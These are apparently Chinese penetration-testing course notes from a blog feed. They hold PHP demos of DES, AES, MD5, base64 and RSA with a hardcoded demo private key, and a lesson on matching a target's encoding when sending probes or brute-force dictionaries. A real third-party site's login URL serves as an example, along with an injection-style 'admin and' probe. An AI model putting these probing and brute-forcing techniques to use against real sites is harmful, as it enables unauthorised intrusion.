class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加密</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $str</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">pkcsPadding</span>(<span class="variable">$str</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$str</span>, <span class="variable">$this</span>-&gt;method, <span class="variable">$this</span>-&gt;key, <span class="variable">$this</span>-&gt;options, <span class="variable">$this</span>-&gt;iv);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;output == <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_BASE64</span>) &#123;</span><br><span class="line">            <span class="variable">$sign</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$sign</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;output == <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_HEX</span>) &#123;</span><br><span class="line">            <span class="variable">$sign</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$sign</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解密</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $encrypted</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$encrypted</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;output == <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_BASE64</span>) &#123;</span><br><span class="line">            <span class="variable">$encrypted</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encrypted</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;output == <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_HEX</span>) &#123;</span><br><span class="line">            <span class="variable">$encrypted</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$encrypted</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sign</span> = @<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encrypted</span>, <span class="variable">$this</span>-&gt;method, <span class="variable">$this</span>-&gt;key, <span class="variable">$this</span>-&gt;options, <span class="variable">$this</span>-&gt;iv);</span><br><span class="line">        <span class="variable">$sign</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">unPkcsPadding</span>(<span class="variable">$sign</span>);</span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">rtrim</span>(<span class="variable">$sign</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 填充</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $str</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $blocksize</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">pkcsPadding</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$blocksize</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pad</span> = <span class="variable">$blocksize</span> - (<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) % <span class="variable">$blocksize</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span> . <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$pad</span>), <span class="variable">$pad</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 去填充</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $str</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">unPkcsPadding</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pad</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>&#123;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pad</span> &gt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, -<span class="number">1</span> * <span class="variable">$pad</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>&#x2F;&#x2F;rsa</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;RSA_PUBLIC&#x27;</span>, <span class="string">&#x27;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmkANmC849IOntYQQdSgLvMMGm</span></span><br><span class="line"><span class="string">8V/u838ATHaoZwvweoYyd+/7Wx+bx5bdktJb46YbqS1vz3VRdXsyJIWhpNcmtKhY</span></span><br><span class="line"><span class="string">inwcl83aLtzJeKsznppqMyAIseaKIeAm6tT8uttNkr2zOymL/PbMpByTQeEFlyy1</span></span><br><span class="line"><span class="string">poLBwrol0F4USc+owwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;RSA_PRIVATE&#x27;</span>,<span class="string">&#x27;-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAKaQA2YLzj0g6e1h</span></span><br><span class="line"><span class="string">BB1KAu8wwabxX+7zfwBMdqhnC/B6hjJ37/tbH5vHlt2S0lvjphupLW/PdVF1ezIk</span></span><br><span class="line"><span class="string">haGk1ya0qFiKfByXzdou3Ml4qzOemmozIAix5ooh4Cbq1Py6202SvbM7KYv89syk</span></span><br><span class="line"><span class="string">HJNB4QWXLLWmgsHCuiXQXhRJz6jDAgMBAAECgYAIF5cSriAm+CJlVgFNKvtZg5Tk</span></span><br><span class="line"><span class="string">93UhttLEwPJC3D7IQCuk6A7Qt2yhtOCvgyKVNEotrdp3RCz++CY0GXIkmE2bj7i0</span></span><br><span class="line"><span class="string">fv5vT3kWvO9nImGhTBH6QlFDxc9+p3ukwsonnCshkSV9gmH5NB/yFoH1m8tck2Gm</span></span><br><span class="line"><span class="string">BXDj+bBGUoKGWtQ7gQJBANR/jd5ZKf6unLsgpFUS/kNBgUa+EhVg2tfr9OMioWDv</span></span><br><span class="line"><span class="string">MSqzG/sARQ2AbO00ytpkbAKxxKkObPYsn47MWsf5970CQQDIqRiGmCY5QDAaejW4</span></span><br><span class="line"><span class="string">HbOcsSovoxTqu1scGc3Qd6GYvLHujKDoubZdXCVOYQUMEnCD5j7kdNxPbVzdzXll</span></span><br><span class="line"><span class="string">9+p/AkEAu/34iXwCbgEWQWp4V5dNAD0kXGxs3SLpmNpztLn/YR1bNvZry5wKew5h</span></span><br><span class="line"><span class="string">z1zEFX+AGsYgQJu1g/goVJGvwnj/VQJAOe6f9xPsTTEb8jkAU2S323BG1rQFsPNg</span></span><br><span class="line"><span class="string">jY9hnWM8k2U/FbkiJ66eWPvmhWd7Vo3oUBxkYf7fMEtJuXu+JdNarwJAAwJK0YmO</span></span><br><span class="line"><span class="string">LxP4U+gTrj7y/j/feArDqBukSngcDFnAKu1hsc68FJ/vT5iOC6S7YpRJkp8egj5o</span></span><br><span class="line"><span class="string">pCcWaTO3GgC5Kg==</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&#x27;xiaodisec&#x27;</span>;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;md5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据:<span class="subst">$password</span>&quot;</span>. <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;MD5加密后:&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>). <span class="string">&quot;&lt;hr/&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;base64</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据:<span class="subst">$password</span>&quot;</span>. <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;BASE64编码后:&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$password</span>). <span class="string">&quot;&lt;hr/&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;aes</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据: &quot;</span> . <span class="variable">$password</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title class_">EncryptionTool</span>::<span class="title function_ invoke__">enAES</span>(<span class="variable">$password</span>, <span class="string">&quot;1234567891234567&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;AES加密后: &quot;</span> . <span class="variable">$data</span> . <span class="string">&quot;&lt;hr/&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &quot;解密后: &quot; . EncryptionTool::deAES($data, &quot;1234567891234567&quot;) . &quot;&lt;br/&gt;&quot;;</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;des</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据:<span class="subst">$password</span>&quot;</span>. <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;key123456&#x27;</span>;</span><br><span class="line"><span class="variable">$iv</span> = <span class="string">&#x27;iv123456&#x27;</span>;</span><br><span class="line"><span class="comment">// DES CBC 加解密</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;DES CBC 加解密:&#x27;</span>;</span><br><span class="line"><span class="variable">$des</span> = <span class="keyword">new</span> <span class="title function_ invoke__">DES</span>(<span class="variable">$key</span>, <span class="string">&#x27;DES-CBC&#x27;</span>, DES::<span class="variable constant_">OUTPUT_BASE64</span>, <span class="variable">$iv</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$base64Sign</span> = <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">encrypt</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo $des-&gt;decrypt($base64Sign);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// DES ECB 加解密</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据:<span class="subst">$password</span>&quot;</span>. <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;DES ECB 加解密:&#x27;</span>;</span><br><span class="line"><span class="variable">$des</span> = <span class="keyword">new</span> <span class="title function_ invoke__">DES</span>(<span class="variable">$key</span>, <span class="string">&#x27;DES-ECB&#x27;</span>, DES::<span class="variable constant_">OUTPUT_BASE64</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$base64Sign</span> = <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">encrypt</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo $des-&gt;decrypt($base64Sign);</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;rsa</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//公钥加密 </span></span><br><span class="line"><span class="variable">$public_key</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(RSA_PUBLIC); </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$public_key</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;公钥不可用&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第一个参数是待加密的数据只能是string，第二个参数是加密后的数据,第三个参数是openssl_pkey_get_public返回的资源类型,第四个参数是填充方式</span></span><br><span class="line"><span class="variable">$return_en</span> = <span class="title function_ invoke__">openssl_public_encrypt</span>(<span class="variable">$password</span>, <span class="variable">$crypted</span>, <span class="variable">$public_key</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$return_en</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;加密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$eb64_cry</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$crypted</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RSA公钥加密数据：&quot;</span>.<span class="variable">$eb64_cry</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//私钥解密</span></span><br><span class="line"><span class="variable">$private_key</span> = <span class="title function_ invoke__">openssl_pkey_get_private</span>(RSA_PRIVATE);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$private_key</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;私钥不可用&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$return_de</span> = <span class="title function_ invoke__">openssl_private_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$eb64_cry</span>), <span class="variable">$decrypted</span>, <span class="variable">$private_key</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$return_de</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;解密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RSA私钥解密数据:&quot;</span>.<span class="variable">$decrypted</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//私钥加密</span></span><br><span class="line"><span class="variable">$private_key</span> = <span class="title function_ invoke__">openssl_pkey_get_private</span>(RSA_PRIVATE);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$private_key</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;私钥不可用&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$return_en</span> = <span class="title function_ invoke__">openssl_private_encrypt</span>(<span class="variable">$password</span>, <span class="variable">$crypted</span>, <span class="variable">$private_key</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$return_en</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;加密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$eb64_cry</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$crypted</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RSA私钥加密数据&quot;</span>.<span class="variable">$eb64_cry</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//公钥解密</span></span><br><span class="line"><span class="variable">$public_key</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(RSA_PUBLIC);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$public_key</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;公钥不可用&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$return_de</span> = <span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$eb64_cry</span>), <span class="variable">$decrypted</span>, <span class="variable">$public_key</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$return_de</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;解密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RSA公钥解密数据:&quot;</span>.<span class="variable">$decrypted</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8基础入门-算法加密</title>
      <link href="/2023/10/02/8%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86/"/>
      <url>/2023/10/02/8%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/">1基础入门</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>13、存储密码加密-应用对象</li><li>14、传输加密编码-发送回显</li><li>15、数据传输格式-统一格式</li><li>16、代码特性混淆-开发语言</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>应用架构：Web&#x2F;APP&#x2F;云应用&#x2F;小程序&#x2F;负载均衡等<br>安全产品：CDN&#x2F;WAF&#x2F;IDS&#x2F;IPS&#x2F;蜜罐&#x2F;防火墙&#x2F;杀毒等<br>渗透命令：文件上传下载&#x2F;端口服务&#x2F;Shell反弹等<br>抓包技术：HTTP&#x2F;TCP&#x2F;UDP&#x2F;ICMP&#x2F;DNS&#x2F;封包&#x2F;代理等<br>算法加密：数据编码&#x2F;密码算法&#x2F;密码保护&#x2F;反编译&#x2F;加壳等</p><h2 id="传输数据-编码型-加密型等"><a href="#传输数据-编码型-加密型等" class="headerlink" title="传输数据-编码型&amp;加密型等"></a>传输数据-编码型&amp;加密型等</h2><p>例：某视频、某Web站、博客登录、APP-斗地主<br>影响：漏洞探针</p><h2 id="传输格式-常规-JSON-XML等"><a href="#传输格式-常规-JSON-XML等" class="headerlink" title="传输格式-常规&amp;JSON&amp;XML等"></a>传输格式-常规&amp;JSON&amp;XML等</h2><p>例：App-期H、APP-斗地主<br>影响：发送漏洞探针,回显数据分析</p><h2 id="密码存储-Web-系统-三方应用"><a href="#密码存储-Web-系统-三方应用" class="headerlink" title="密码存储-Web&amp;系统&amp;三方应用"></a>密码存储-Web&amp;系统&amp;三方应用</h2><p>例：ZZZCMS&amp;Dz、Win&amp;Linux、MSSQL&amp;MYSQL<br>影响：安全后渗透测试</p><h2 id="代码混淆-源代码加密-逆向保护"><a href="#代码混淆-源代码加密-逆向保护" class="headerlink" title="代码混淆-源代码加密&amp;逆向保护"></a>代码混淆-源代码加密&amp;逆向保护</h2><p>例：PHP&amp;JS混淆加密、EXE&amp;JAR代码保护<br>影响：代码审计，逆向破解<br><a href="https://indialms.in/wfp_login.php?r_id=1">https://indialms.in/wfp_login.php?r_id=1</a><br>base64编码<br>username&#x3D;YWRtaW4&#x3D;<br><a href="https://indialms.in/wfp_login.php?r_id=MQ==112123">https://indialms.in/wfp_login.php?r_id=MQ==112123</a></p><h3 id="数据在传输的时候进行编码-为什么要了解？"><a href="#数据在传输的时候进行编码-为什么要了解？" class="headerlink" title="数据在传输的时候进行编码 为什么要了解？"></a>数据在传输的时候进行编码 为什么要了解？</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;对方服务器可能会在接受的时候进行解码在带入如果我们还是按照原有思路不对自己的Payload进行同样编码的话 传入过去的东西就是不认识的东西 测试无效<br>&nbsp;&nbsp;&nbsp;&nbsp;正确：测试的话也要进行payload同样的加密或编码进行提交安全测试漏洞时候 通常都会进行数据的修改增加提交测试以数据的正确格式发送接受才行<br>登录的数据包：<br>&nbsp;&nbsp;&nbsp;&nbsp;admin 123456<br>MD5加密：<br>&nbsp;&nbsp;&nbsp;&nbsp;username&#x3D;admin&amp;password&#x3D;123456<br>&nbsp;&nbsp;&nbsp;&nbsp;username&#x3D;admin&amp;password&#x3D;e10adc3949ba59abbe56e057f20f883e  </p><p>###如果进行密码破解爆破<br>字典文件：<br>帐号什么都不用更改 去替换username&#x3D;值即可<br>密码需要进行密码算法 保证和password&#x3D;值同等加密才行<br><a href="https://tv.sohu.com/v/dXMvMzg1MjM2NzE5LzQyNzUyODUzOC5zaHRtbA==.html">https://tv.sohu.com/v/dXMvMzg1MjM2NzE5LzQyNzUyODUzOC5zaHRtbA==.html</a></p><p>开发：数组 列表<br>btnPost&#x3D;%E7%99%BB%E5%BD%95&amp;username&#x3D;admin and&amp;password&#x3D;e10adc3949ba59abbe56e057f20f883e&amp;savedate&#x3D;1  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">btnPost:&quot;%E7%99%BB%E5%BD%95&quot;；</span><br><span class="line">username:&quot;admin&quot;;</span><br><span class="line">password:&quot;e10adc3949ba59abbe56e057f20f883e and&quot;;</span><br><span class="line">savedate:1;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>json xml 常规<br>x&#x3D;123</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">x:123</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>zzzcms admin &#x2F;123456 密文利用md5加密<br>md5(123456)&#x3D;密文<br>dz3.2 admin &#x2F;123456<br>md5(md5(123456).salt)&#x3D;密文<br>dz3.5 admin &#x2F; 123456<br>aes des（密匙 偏移量 填充 模式等）<br>$2y$10$OtsSmawENczg1BLcQCEn5OdLqJC9GLiDrClwEUooNnn8b609DfJc.  </p><p>大部分的解密都是碰撞式解密<br>不是算法的逆向的还原解密  </p><ul><li>1.常见加密编码进制等算法解析<br>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</li><li>2.常见加密编码形式算法解析<br>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</li><li>3.常见解密解码方式（针对）<br>枚举，自定义逆向算法，可逆向<br>4.常见加密解码算法的特性<br>长度位数，字符规律，代码分析，搜索获取等</li></ul><h2 id="本课意义："><a href="#本课意义：" class="headerlink" title="本课意义："></a>本课意义：</h2><p>1.了解加密编码进制在安全测试中的存在<br>2.掌握常见的加密解密编码解码进制互转的操作<br>3.了解常见的加密解密编码解密进制互转的影响  </p><p>识别算法编码方法：<br>1、看密文位数<br>2、看密文的特征（数字，字母，大小写，符号等）<br>3、看当前密文存在的地方（Web，数据库，操作系统等应用）  </p><h2 id="拓展补充参考资料："><a href="#拓展补充参考资料：" class="headerlink" title="拓展补充参考资料："></a>拓展补充参考资料：</h2><ul><li><p>1.传输数据编码：<br>BASE64 URL HEX ASCII<br>1.BASE64值是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,结尾通常有符号&#x3D;<br>2.URL编码是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,通常以%数字字母间隔<br>3.HEX编码是计算机中数据的一种表示方法,将数据进行十六进制转换,它由0-9,A-F,组成<br>4.ASCII编码是将128个字符进行进制数来表示,常见ASCII码表大小规则：0<del>9&lt;A</del>Z&lt;a~z<br>-传输数据加密：同密码存储加密<br>-传输数据格式：常规字符串 JSON XML等 </p></li><li><p>2.密码存储加密：<br>MD5 SHA1 NTLM AES DES RC4<br>1.MD5值是32或16位位由数字”0-9”和字母”a-f”所组成的字符串<br>2.SHA1这种加密的密文特征跟MD5差不多，只不过位数是40<br>3.NTLM这种加密是Windows的哈希密码，标准通讯安全协议<br>4.AES,DES,RC4这些都是对称性加密算法，RSA非对称加密；引入密钥，密文特征与Base64类似  </p></li><li><p>3.代码混淆：<br>JS前端代码加密：<br>JS颜文字 jother JSFUCK<br>1.颜文字特征：一堆颜文字构成的js代码，在F12中可直接解密执行<br>2.jother特征：只用! + ( ) [ ] { }这八个字符就能完成对任意字符串的编码。也可在F12中解密执行<br>3.JSFUCK特征：与jother很像，只是少了{ }  </p></li><li><p>4.后端代码混淆：<br>PHP .NET JAVA<br>1.PHP：乱码，头部有信息<br>2..NET：DLL封装代码文件，加保护<br>3.JAVA：JAR&amp;CLASS文件，，加保护<br>举例：加密平台 Zend ILSpy IDEA<br>应用场景：版权代码加密，开发特性，CTF比赛等  </p></li><li><p>5.特定应用-数据库密文加密：<br>MYSQL MSSQL Oracle Redis等</p></li><li><p>6.数据显示编码：<br>UTF-8 GBK2312等</p></li><li><p>7.部分资源：<br><a href="https://www.cmd5.com/">https://www.cmd5.com</a><br><a href="http://tmxk.org/jother">http://tmxk.org/jother</a><br><a href="http://www.jsfuck.com/">http://www.jsfuck.com</a><br><a href="http://www.hiencode.com/">http://www.hiencode.com</a><br><a 